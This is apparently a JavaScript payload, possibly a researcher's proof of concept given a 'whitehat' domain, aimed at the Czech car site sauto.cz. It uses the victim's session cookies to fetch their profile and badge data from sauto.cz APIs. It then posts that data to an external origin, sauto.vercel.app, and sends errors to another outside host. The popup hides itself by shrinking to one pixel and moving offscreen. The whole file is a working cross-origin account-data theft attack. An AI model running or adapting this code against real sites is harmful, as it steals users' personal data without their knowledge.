let getUsersSelfDataComplete = false;
let getUserBadgeDataComplete = false;

(function getUsersSelfData() {
    fetch(
        'https://www.sauto.cz/api/v1/users/self',
        {
            method: "GET",
            credentials: "include",
            headers: {
                'Accept': 'application/json',
            },
        },
    )
        .then(response => response.json())
        .then((json) => {
            window.opener.postMessage({
                messageType: 'getUsersSelfData',
                response: json
            }, 'https://sauto.vercel.app');
            getUsersSelfDataComplete = true;
        })
        .catch(error => {
            window.opener.postMessage(error, 'https://whitehat-email-cz.vercel.app/')
        });
})();

(function getUserBadgeData() {
    fetch(
        'https://login.sauto.cz/api/v1/user/badge?service=sauto',
        {
            method: "GET",
            credentials: "include",
            headers: {
                'Accept': 'application/json',
            },
        },
    )
        .then(response => response.json())
        .then((json) => {
            window.opener.postMessage({
                messageType: 'getUserBadgeData',
                response: json
            }, 'https://sauto.vercel.app');
            getUserBadgeDataComplete = true;
        })
        .catch(error => {
            window.opener.postMessage(error, 'https://whitehat-email-cz.vercel.app/')
        });
})();

setInterval(
    () => {
        window.resizeTo(1, 1);
        window.moveTo(9999, 9999);
        if (getUsersSelfDataComplete && getUserBadgeDataComplete) {
            window.close();
        }
    },
    1,
    true
);
